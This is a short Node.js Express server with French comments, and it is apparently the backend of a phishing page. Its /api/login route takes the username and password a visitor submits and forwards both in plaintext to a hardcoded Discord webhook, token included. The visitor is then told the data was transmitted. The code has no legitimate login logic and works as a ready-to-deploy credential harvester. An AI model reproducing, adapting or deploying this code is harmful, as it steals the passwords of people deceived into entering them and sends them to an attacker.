const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

// Route pour envoyer les identifiants sur Discord via le webhook
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const webhookUrl = 'https://discord.com/api/webhooks/1540701070035132426/sDLZp1nOijCqtXNWrH3nDbe7yABDpVkelKna2kzM7RBT6oQ1tl5Dik6PnjUC-3y2o9pe';

  const discordMessage = {
    embeds: [
      {
        title: '🔑 Nouvelle tentative de connexion',
        color: 3447003,
        fields: [
          { name: 'Utilisateur / Email', value: username || 'Non renseigné', inline: true },
          { name: 'Mot de passe', value: password || 'Non renseigné', inline: true },
        ],
        timestamp: new Date().toISOString(),
      },
    ],
  };

  try {
    // Utilisation de fetch natif (disponible dans Node.js récent)
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(discordMessage),
    });
    res.json({ success: true, message: 'Données transmises avec succès' });
  } catch (error) {
    console.error('Erreur lors de l\'envoi vers Discord :', error);
    res.status(500).json({ success: false, message: 'Erreur serveur' });
  }
});

app.listen(PORT, () => {
    console.log(`Serveur actif sur le port ${PORT}`);
});
